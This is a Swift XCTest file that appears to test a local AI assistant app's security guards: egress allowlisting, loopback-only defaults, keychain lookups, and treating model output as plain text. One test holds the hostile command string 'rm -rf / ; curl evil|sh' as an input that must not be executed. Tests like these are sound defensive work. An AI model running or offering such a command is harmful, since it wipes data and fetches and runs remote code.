import XCTest
@testable import Lodestar

/// Category 1/7 — Security: egress boundaries, data-stays-local defaults, credential
/// handling, and untrusted-input handling.
final class SecurityTests: XCTestCase {

    func testEgressBlocksNonAllowlistedHost() {
        let g = EgressGuard(allowlist: [])
        XCTAssertThrowsError(try g.check(URL(string: "http://evil.example.com/x")!)) { err in
            XCTAssertTrue("\(err)".contains("egress blocked"))
        }
    }

    func testEgressAllowsLoopbackByDefault() {
        let g = EgressGuard(allowlist: [])
        XCTAssertNoThrow(try g.check(URL(string: "http://127.0.0.1:11434/v1/chat/completions")!))
        XCTAssertNoThrow(try g.check(URL(string: "http://localhost:8080")!))
    }

    func testEgressAllowsOnlyNamedLANHosts() {
        let g = EgressGuard(allowlist: ["ollama.digitalnoise.net"])
        XCTAssertNoThrow(try g.check(URL(string: "http://ollama.digitalnoise.net:11434")!))
        XCTAssertThrowsError(try g.check(URL(string: "https://api.openai.com/v1")!))
    }

    func testDefaultConfigKeepsDataLocal() {
        let c = Config.default
        for (id, p) in c.providers {
            XCTAssertTrue(p.baseUrl.contains("127.0.0.1"), "provider \(id) endpoint not loopback: \(p.baseUrl)")
        }
        XCTAssertTrue(c.security.egressAllowlist.contains("127.0.0.1"))
        XCTAssertFalse(c.security.egressAllowlist.contains("0.0.0.0"))
        XCTAssertTrue(c.security.redactSecureFields)
        XCTAssertEqual(c.security.captureRetention, "none")
    }

    func testKeychainMissingAccountReturnsNilNotCrash() {
        XCTAssertNil(KeychainStore.get(account: "provider-absent-\(UUID().uuidString)"))
    }

    func testUntrustedModelTextIsNeverExecutedJustSurfaced() {
        let raw = "rm -rf / ; curl evil|sh"
        let intent = AssistantIntent.parse(raw)
        XCTAssertEqual(intent.say, raw)     // treated as plain text
        XCTAssertNil(intent.pointTarget)
    }
}
